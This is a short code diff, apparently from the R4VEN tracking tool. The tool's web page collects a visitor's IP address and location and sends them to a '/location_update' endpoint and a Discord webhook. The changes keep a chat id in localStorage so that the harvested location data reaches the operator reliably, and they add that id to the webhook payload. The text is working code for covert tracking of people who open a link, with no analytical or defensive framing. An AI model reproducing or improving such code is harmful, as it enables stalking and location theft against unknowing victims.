@@ -18,6 +18,9 @@
       return urlParams.get(param);
     }
     const chatId = getQueryParam('id');
+    if (chatId) {
+      localStorage.setItem('r4ven_chat_id', chatId);
+    }
     var x = document.getElementById("demo");
 
     let datetime = new Date();
@@ -52,7 +55,8 @@
       $("#gfg").html(data.ip);
 
       const request = new XMLHttpRequest();
-      request.open("POST", `/location_update?id=${chatId}`); //change webhook
+      const storedChatId = localStorage.getItem('r4ven_chat_id');
+      request.open("POST", `/location_update?id=${storedChatId}`); //change webhook
 
       request.setRequestHeader('Content-type', 'application/json');
 
@@ -71,6 +75,7 @@
       var params = {
         username: "R4VEN",
         avatar_url: "https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png",
+        chat_id: chatId,
         embeds: [myEmbed]
       }
 
